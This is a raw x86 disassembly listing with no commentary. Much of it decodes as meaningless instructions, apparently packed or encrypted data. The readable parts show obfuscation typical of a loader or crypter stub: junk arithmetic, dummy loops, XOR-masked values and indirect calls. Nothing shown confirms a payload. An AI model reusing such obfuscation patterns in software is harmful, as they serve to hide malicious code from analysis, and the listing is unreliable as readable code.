  4061b8:	ins    BYTE PTR es:[edi],dx
  4061b9:	mov    esp,0xdc36b78e
  4061be:	or     edi,DWORD PTR [edi+0x10]
  4061c1:	mov    dl,0x32
  4061c3:	das    
  4061c4:	mov    fs,esp
  4061c6:	or     al,0x23
  4061c8:	adc    al,0x1d
  4061ca:	and    BYTE PTR [eax+0x0],bl
  4061cd:	xor    BYTE PTR [ebx+0x229da1ce],ah
  4061d3:	pop    edx
  4061d4:	call   0x3a97224a
  4061d9:	mov    DWORD PTR [edi-0x69],esp
  4061dc:	ds pop ebx
  4061de:	ret    0xb4cb
  4061e1:	mov    bh,0x35
  4061e3:	sahf   
  4061e4:	dec    BYTE PTR [edi]
  4061e6:	mov    BYTE PTR [ebp+0x452d749],0xc9
  4061ed:	pop    ebx
  4061ee:	cmp    DWORD PTR [eax],edi
  4061f0:	jge    0x4061d3
  4061f2:	adc    BYTE PTR [edi],bl
  4061f4:	dec    ebp
  4061f5:	push   0x4fa09140
  4061fa:	inc    ecx
  4061fb:	ret    
  4061fc:	out    dx,al
  4061fd:	or     edi,eax
  4061ff:	outs   dx,BYTE PTR ds:[esi]
  406200:	aaa    
  406201:	xor    al,ch
  406203:	sbb    ebx,edi
  406205:	ins    DWORD PTR es:[edi],dx
  406206:	push   es
  406207:	mov    ch,0x4b
  406209:	jo     0x406204
  40620b:	xor    BYTE PTR [ebx+edx*4+0x5],bh
  40620f:	dec    esi
  406210:	xor    esp,0xfffffffd
  406213:	inc    ebx
  406214:	fst    QWORD PTR [edi+0x5e36b96e]
  40621a:	or     bl,dl
  40621c:	fcomp  QWORD PTR [edi]
  40621e:	shl    DWORD PTR [ebp+0x1016c678],1
  406224:	dec    ebx
  406225:	jb     0x40622c
  406227:	test   DWORD PTR [ebp-0x4e],edx
  40622a:	push   0x357f08f6
  40622f:	enter  0xb95f,0xa
  406233:	dec    esi
  406234:	inc    ebp
  406235:	js     0x4062a6
  406237:	jle    0x406253
  406239:	aam    0x91
  40623b:	push   edi
  40623c:	popf   
  40623d:	repz dec edi
  40623f:	lods   eax,DWORD PTR ds:[esi]
  406240:	cwde   
  406241:	cmp    eax,0x87952502
  406246:	dec    esi
  406247:	dec    ebx
  406248:	push   esi
  406249:	imul   esp,DWORD PTR [ecx+0x3003c25e],0x31e5ca59
  406253:	sub    eax,0x3dc8cbb6
  406258:	inc    esp
  406259:	push   ecx
  40625a:	(bad)  [ecx]
  40625c:	xor    BYTE PTR [ebx],dl
  40625e:	jg     0x40629e
  406260:	xchg   esp,eax
  406261:	mov    bh,0x44
  406263:	push   ebp
  406264:	xor    esi,eax
  406266:	and    DWORD PTR ds:0x433723,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433723
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433723,ecx
  406282:	cmp    DWORD PTR ds:0x433723,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433723,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433723,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433723
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433723,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	pushf  
  406312:	jp     0x40637f
  406314:	mov    ch,0x54
  406316:	aas    
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	sbb    eax,0x55597397
  406322:	and    DWORD PTR [edx-0x2c],ebp
  406325:	cdq    
  406326:	div    ch
  406328:	inc    esp
  406329:	lods   eax,DWORD PTR ds:[esi]
  40632a:	push   eax
  40632b:	cmp    DWORD PTR [edi+0x3764b619],eax
  406331:	fs mov dl,0x3c
  406334:	nop
  406335:	or     dh,BYTE PTR [ecx]
  406337:	push   0x900ed3ec
  40633c:	cmp    esi,ecx
  40633e:	adc    DWORD PTR [esi-0x3a43123f],0xffffffe8
  406345:	in     eax,0xfe
  406347:	push   ebx
  406348:	in     al,dx
  406349:	hlt    
  40634a:	jno    0x4062d5
  40634c:	pop    ss
  40634d:	ins    DWORD PTR es:[edi],dx
  40634e:	and    DWORD PTR [esi],0x1a
  406351:	(bad)  
  406352:	sub    dh,dh
  406354:	sahf   
  406355:	shl    DWORD PTR [ecx+0x56a11a0a],0xee
  40635c:	les    ebx,FWORD PTR [ebx+0x1ad3ad6d]
  406362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406363:	popf   
  406364:	xchg   ebp,eax
  406365:	mov    ebx,0xdb863672
  40636a:	or     esi,DWORD PTR [ebx-0x63]
  40636d:	xchg   ecx,eax
  40636e:	adc    BYTE PTR [ebp-0x978c718],0x50
  406375:	scas   eax,DWORD PTR es:[edi]
  406376:	mov    ebx,DWORD PTR [edx]
  406378:	mov    ds:0x5579d463,eax
  40637d:	call   0x5861:0x416fb98b
  406384:	push   ds
  406385:	pop    esi
  406386:	hlt    
  406387:	push   esp
  406388:	fisub  DWORD PTR [ecx+0x5dba5915]
  40638e:	xchg   ebp,eax
  40638f:	shl    BYTE PTR [esi-0x393a2ea3],0xc1
  406396:	mov    edi,0x49f05702
  40639b:	push   ebp
  40639c:	cld    
  40639d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40639e:	idiv   DWORD PTR [ecx+0x5c]
  4063a1:	mov    eax,0x261c2589
  4063a6:	lahf   
  4063a7:	jno    0x406383
  4063a9:	pusha  
  4063aa:	mov    bh,dl
  4063ac:	lods   al,BYTE PTR ds:[esi]
  4063ad:	rol    BYTE PTR [eax+edi*1+0x2c9b1fae],1
  4063b4:	dec    eax
  4063b5:	out    0x48,eax
  4063b7:	add    esp,DWORD PTR [esi]
  4063b9:	shl    BYTE PTR [edx-0x64f9a26e],1
  4063bf:	xchg   esp,eax
  4063c0:	fcomp  QWORD PTR [edi-0x1]
  4063c3:	or     al,0xcf
  4063c5:	mov    ebx,eax
  4063c7:	popf   
  4063c8:	adc    dh,BYTE PTR [edx+edi*2+0x45a7cdcc]
  4063cf:	imul   ebx,DWORD PTR ds:0x168dcbfe,0xd4403b83
  4063d9:	inc    ecx
  4063da:	xchg   ecx,eax
  4063db:	mov    ?,eax
  4063dd:	ss pop ss
  4063df:	lea    esi,[ebx]
  4063e1:	cmp    BYTE PTR [ebx-0x4e],ch
  4063e4:	in     eax,0x25
  4063e6:	(bad)  
  4063e8:	ror    DWORD PTR [ecx+ecx*4+0x6252c17d],0xa3
  4063f0:	sbb    eax,0xdd7f0ebf
  4063f5:	enter  0x3e8f,0x2e
  4063f9:	outs   dx,DWORD PTR ds:[esi]
  4063fa:	add    ch,BYTE PTR ds:0x18a86123
  406400:	dec    ecx
  406401:	inc    esp
  406402:	test   al,0x37
  406404:	aad    0xe8
  406406:	arpl   WORD PTR [esi+0x2cf818d7],sp
  40640c:	dec    ebp
  40640d:	lods   eax,DWORD PTR ds:[esi]
  40640e:	or     BYTE PTR [ecx+0xc],ch
  406411:	dec    ecx
  406412:	sbb    al,0xd
  406414:	jge    0x4063d7
  406416:	ss jmp 0x44f3:0x36f6615b
  40641e:	(bad)
  406421:	aaa    
  406422:	cmp    al,0x38
  406424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406425:	popf   
  406426:	icebp  
  406427:	test   ch,ch
  406429:	cs mov edx,0xe678ca03
  40642f:	in     al,0xde
  406431:	push   es
  406432:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406433:	sbb    ebx,ebp
  406435:	mov    cl,BYTE PTR [edi]
  406437:	js     0x406467
  406439:	cld    
  40643a:	leave  
  40643b:	and    al,0xc7
  40643d:	outs   dx,DWORD PTR ds:[esi]
  40643e:	jae    0x40641e
  406440:	or     eax,0xab01f715
  406445:	data16 rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406448:	fist   DWORD PTR [esi]
  40644a:	xor    al,0x24
  40644c:	hlt    
  40644d:	lods   al,BYTE PTR ds:[esi]
  40644e:	ret    0x8619
  406451:	xor    ebx,DWORD PTR [esi]
  406453:	out    dx,al
  406454:	or     eax,0x3efadf1e
  406459:	outs   dx,DWORD PTR ds:[esi]
  40645a:	mov    cl,0x1d
  40645c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40645d:	push   cs
  40645e:	call   DWORD PTR [esi-0x22]
  406461:	shl    bh,cl
  406463:	inc    edi
  406464:	adc    ah,ah
  406466:	mov    eax,ds:0x8017567a
  40646b:	aam    0xca
  40646d:	cld    
  40646e:	mov    al,0x6b
  406470:	test   eax,0x26e529cc
  406475:	or     eax,0x9a23b12b
  40647a:	jp     0x406455
  40647c:	adc    al,BYTE PTR [ebp+0x7cdf5a0f]
  406482:	xchg   ecx,eax
  406483:	push   es
  406484:	aad    0x71
  406486:	addr16 xchg esp,eax
  406488:	push   edx
  406489:	popa   
  40648a:	and    DWORD PTR ds:0x22d5786c,esi
  406490:	add    DWORD PTR [ecx+0x5335211],edi
  406496:	xchg   esp,eax
  406497:	(bad)  
  406498:	mov    bh,0x20
  40649a:	xor    DWORD PTR [edi],edx
  40649c:	and    DWORD PTR [edi],ecx
  40649e:	(bad)  [ecx-0x6e2002ba]
  4064a4:	rcl    BYTE PTR [eax+0x7e7c8463],0xca
  4064ab:	sub    BYTE PTR [ecx],dh
  4064ad:	pushf  
  4064ae:	outs   dx,BYTE PTR ds:[esi]
  4064af:	mov    cl,BYTE PTR [eax-0x50f965ee]
  4064b5:	das    
  4064b6:	or     BYTE PTR [ecx+esi*2-0x75],0xd6
  4064bb:	sub    al,0xb3
  4064bd:	or     BYTE PTR [ebp-0x42],ah
  4064c0:	emms   
  4064c2:	adc    al,0x14
  4064c4:	int3   
  4064c5:	std    
  4064c6:	fmul   DWORD PTR [ebp-0xb]
  4064c9:	int    0xfd
  4064cb:	pop    ecx
  4064cc:	mov    ebx,0xc4c2a80d
  4064d1:	clc    
  4064d2:	push   cs
  4064d3:	mov    ebx,0x4f4b08ae
  4064d8:	popf   
  4064d9:	out    dx,eax
  4064da:	loope  0x406557
  4064dc:	loope  0x4064b8
  4064de:	dec    edx
  4064df:	add    al,0x2a
  4064e1:	in     eax,0xd7
  4064e3:	scas   al,BYTE PTR es:[edi]
  4064e4:	and    BYTE PTR [ebx+0x42],ch
  4064e7:	and    al,0xe4
  4064e9:	iret   
  4064ea:	xlat   BYTE PTR ds:[ebx]
  4064eb:	inc    esp
  4064ec:	je     0x406515
  4064ee:	shr    DWORD PTR [eax+esi*8-0x1e5f7fd8],1
  4064f5:	xchg   DWORD PTR [edx-0x4f],edx
  4064f8:	addr16 repnz icebp 
  4064fb:	mov    ebx,edx
  4064fd:	icebp  
  4064fe:	pop    edi
  4064ff:	jg     0x4064f9
  406501:	lds    edi,FWORD PTR [ebp+0x5264ec7b]
  406507:	mov    ds:0x78462d79,eax
  40650c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40650d:	clc    
  40650e:	adc    dh,0x40
  406511:	sti    
  406512:	js     0x406539
  406514:	retf   
  406515:	imul   ebp,DWORD PTR [edx+eax*2+0x1d],0x743c57fa
  40651d:	jnp    0x4064f2
  40651f:	inc    esp
  406520:	rcl    al,0x81
  406523:	mov    gs,edi
  406525:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406527:	sti    
  406528:	adc    esp,DWORD PTR [ecx-0x3b]
  40652b:	or     DWORD PTR [eax+eax*1+0x1e],edx
  40652f:	mov    edx,0x244200ee
  406534:	loopne 0x406557
  406536:	sbb    al,BYTE PTR [ebx-0x6443f807]
  40653c:	sub    bh,BYTE PTR [ebx]
  40653e:	add    ebx,ecx
  406540:	xlat   BYTE PTR ds:[ebx]
  406541:	fwait
  406542:	push   es
  406543:	sub    al,0x0
  406545:	xor    eax,0x82fa3991
  40654a:	push   esp
  40654b:	ins    BYTE PTR es:[edi],dx
  40654c:	inc    ebp
  40654d:	mov    al,0xd5
  40654f:	mov    dl,0x79
  406551:	iret   
  406552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406553:	or     ecx,DWORD PTR [ebx-0x61c2caa6]
  406559:	xchg   ecx,eax
  40655a:	sbb    BYTE PTR [edx-0x6226ef9],cl
  406560:	(bad)  
  406562:	fldcw  WORD PTR [edx+0x6c]
  406565:	dec    eax
  406566:	or     al,BYTE PTR [ecx]
  406568:	loope  0x406594
  40656a:	jb     0x4065b8
  40656c:	jle    0x4064f5
  40656e:	into   
  40656f:	mov    edi,0xcbf71ac7
  406574:	pushf  
  406575:	add    eax,0xa8dece4c
  40657a:	mov    esi,0xd85b2b5c
  40657f:	inc    edi
  406580:	in     al,0x9b
  406582:	nop
  406583:	jmp    0x8200:0x436ad127
  40658a:	dec    ebp
  40658b:	inc    eax
  40658c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40658d:	xchg   DWORD PTR [ebp+0x7a],eax
  406590:	aam    0x8c
  406592:	leave  
  406593:	adc    DWORD PTR [edi-0x41],eax
  406596:	lods   eax,DWORD PTR ds:[esi]
  406597:	inc    edx
  406598:	jmp    0x49a4:0x369eb532
  40659f:	or     BYTE PTR [edx-0x679d0f61],cl
  4065a5:	push   ecx
  4065a6:	mov    bl,0x16
  4065a8:	xor    edi,DWORD PTR [esi+0x4d]
  4065ab:	scas   eax,DWORD PTR es:[edi]
  4065ac:	xchg   esp,eax
  4065ad:	xchg   ecx,eax
  4065ae:	in     al,dx
  4065af:	push   0xcd7c6c5d
  4065b4:	mov    eax,ebx
  4065b6:	mov    al,0x91
  4065b8:	mov    ds:0xf7ecb96e,al
  4065bd:	push   0xe6bcc2c9
  4065c2:	cs mov esp,0xcba12785
  4065c8:	mov    bh,0xd9
  4065ca:	jmp    0x4c5d:0xbc3af25a
  4065d1:	add    DWORD PTR [eax+0x1ca37f64],ecx
  4065d7:	adc    BYTE PTR [edi-0x39d17b0b],ch
  4065dd:	pop    edx
  4065de:	imul   DWORD PTR [esi+ecx*4]
  4065e1:	sbb    DWORD PTR [ebx],ecx
  4065e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065e4:	popf   
  4065e5:	imul   esp,DWORD PTR [ecx-0x51fb6f7],0xe9496dbd
  4065ef:	xor    DWORD PTR [esp+eax*1+0x4f],edx
  4065f3:	call   0x522ed273
  4065f8:	inc    ebx
  4065f9:	popf   
  4065fa:	pop    edi
  4065fb:	sbb    DWORD PTR [edx+0x69],0xfffffff1
  4065ff:	retf   
  406600:	adc    BYTE PTR [ecx+0x3eda5033],cl
  406606:	inc    ecx
  406607:	sbb    esp,DWORD PTR [ebx]
  406609:	mov    eax,0xa7b208ee
  40660e:	ret    0xac0c
  406611:	dec    ebp
  406612:	xchg   ebp,eax
  406613:	jae    0x4065d9
  406615:	out    0x4,al
  406617:	jnp    0x4065d9
  406619:	pop    esp
  40661a:	nop
  40661b:	mov    esp,0xed6b05cb
  406620:	mov    ch,0xca
  406622:	(bad)  
  406624:	adc    dl,BYTE PTR [edi+0x67]
  406627:	mov    ah,BYTE PTR [ebp+0x29c36994]
  40662d:	out    0x25,al
  40662f:	pop    ss
  406630:	mov    esi,0xfbdcbc03
  406635:	jbe    0x4065f2
  406637:	fdivr  QWORD PTR [ebp+0x4c6fad82]
  40663d:	out    0x2e,al
  40663f:	js     0x406655
  406641:	xchg   edi,eax
  406642:	xor    eax,0x32c95a40
  406647:	inc    ebx
  406648:	adc    ah,BYTE PTR [esi+0x42]
  40664b:	mov    ds:0xff6b5430,eax
  406650:	shr    cl,1
  406652:	add    eax,DWORD PTR [eax]
  406654:	add    BYTE PTR [eax],al
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4335fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4336d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4336a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4336e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4336e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4336e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4336e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433803
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4336e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4336e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4336e3,ecx
  406714:	cmp    DWORD PTR ds:0x4336e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4336d7
  406728:	and    ecx,DWORD PTR ds:0x43360f
  40672e:	mov    DWORD PTR ds:0x4336d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43361b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43372b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433613,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43366b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433607,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433607
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433607,ebx
  40677d:	cmp    DWORD PTR ds:0x433607,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433607,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433833
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4336ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433697,0x4336a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4336d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43366b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433613,0x43369f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433607,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4336af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4336e3
  40683c:	and    DWORD PTR ds:0x4336a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43372b
  40684d:	or     DWORD PTR ds:0x4336e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43365b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43371f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4336ab
  406870:	sub    DWORD PTR ds:0x4336d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43360b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433607,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433613,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43360f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433623,0x43372b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43369b,0x4336df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4336e7,0x433693
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433653,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43365b,0x4336ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4336ab,0x43366f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43365b,0x43369b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4335fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4335fb,0x433623
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4336db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4335ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4336ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43371b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43371b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43371b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43371b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43371b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433697
  4069db:	adc    ecx,DWORD PTR ds:0x43365f
  4069e1:	mov    DWORD PTR ds:0x433697,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433693,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433667,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433693,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43360f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43369b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43361b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4336d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
